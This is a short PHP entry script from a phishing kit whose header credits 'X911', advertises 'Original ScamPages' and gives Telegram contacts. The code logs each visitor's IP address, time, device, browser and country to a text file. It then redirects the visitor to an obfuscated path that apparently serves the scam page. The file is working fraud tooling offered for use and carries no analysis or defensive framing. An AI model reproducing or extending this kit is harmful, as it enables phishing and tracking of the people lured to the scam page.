<?php
/// Coder By X911
/// Contact Me For More Original ScamPages
/// X911 Group https://t.me/X911_tools
/// X911 Contact https://t.me/Code_x911

include('./SPPRTZLKDJ/Config/911.php');
include('./SPPRTZLKDJ/Config/COUNTRY.php');
include('./SPPRTZLKDJ/Config/SYS.php');

	$file = fopen("911.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".$date."/DEVICE=".$user_os."/BROWSER=".$user_browser." >> [$get_user_country]\n");
header("Location: ./SPPRTZLKDJ/index.php?FGDD=1#HDHKJDJDSSJDSJKJDSJDSDJJDSHYKJHGFG");
?>